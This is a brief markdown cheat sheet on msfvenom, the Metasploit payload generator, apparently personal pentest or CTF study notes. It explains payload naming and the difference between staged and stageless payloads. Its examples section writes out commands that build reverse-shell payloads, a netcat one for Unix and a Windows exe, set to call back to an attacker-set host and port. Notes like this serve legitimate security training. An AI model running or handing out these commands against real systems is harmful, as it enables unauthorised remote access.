# Overview
## General syntax
```bash
msfvenom -p PAYLOAD OPTIONS
```
## Payload syntax
`<OS>/<arch>/<payload>`

### Staged vs stageless payloads
Stageless payload is fully within underscores:
- linux/x86/shell_reverse_tcp
- linux/x86/meterpreter_reverse_tcp
- windows/shell_reverse_tcp          # 32 bits windows payloads don't precise the arch
- windows/x64/shell_reverse_tcp

Staged payload are named in two steps: 
- linux/x86/shell/reverse_tcp
- windows/x64/meterpreter/reverse_tcp

# Listing payloads
```bash
msfvenom --list payloads
```

# Examples
```bash
# Create a reverse shell with a target UNIX
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
msfvenom -p windows/shell_reverse_tcp -f exe -o shell.exe LHOST=HOST_IP LPORT=LISTENING_PORT
```